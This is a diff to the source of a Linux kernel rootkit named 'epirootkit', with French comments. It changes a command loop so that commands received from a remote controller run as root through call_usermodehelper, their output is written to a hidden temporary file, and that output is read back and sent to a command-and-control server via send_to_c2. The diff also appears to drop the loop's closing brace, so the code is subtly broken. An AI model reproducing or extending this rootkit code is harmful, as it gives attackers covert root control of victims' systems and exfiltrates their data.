@@ -154,7 +154,11 @@ static int command_loop(void *data) {
         }
 
         // Si on est authentifié, on exécute la commande
-        char *argv[] = {"/bin/sh", "-c", buffer, NULL};
+        // LA coommande redirigée vers un fichier temporaire
+        char full_cmd[2048];
+        snprintf(full_cmd, sizeof(full_cmd), "%s > /tmp/.rk_out 2>&1", buffer);
+
+        char *argv[] = {"/bin/sh", "-c", full_cmd, NULL};
         char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
 
         int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
@@ -162,8 +166,23 @@ static int command_loop(void *data) {
             pr_err("epirootkit: command failed (%d)\n", ret);
         else
             pr_info("epirootkit: command executed\n");
-    }
 
+        // On lit et on envoi au C2
+        struct file *f = filp_open("/tmp/.rk_out", O_RDONLY, 0);
+        if (!IS_ERR(f)) {
+            loff_t pos = 0;
+            ssize_t rlen = 0;
+            char outbuf[1024];
+
+            do {
+                memset(outbuf, 0, sizeof(outbuf));
+                rlen = kernel_read(f, outbuf, sizeof(outbuf) - 1, &pos);
+                if (rlen > 0)
+                    send_to_c2(outbuf, rlen);
+            } while (rlen > 0);
+
+            filp_close(f, NULL);
+        }
     return 0;
 }
 
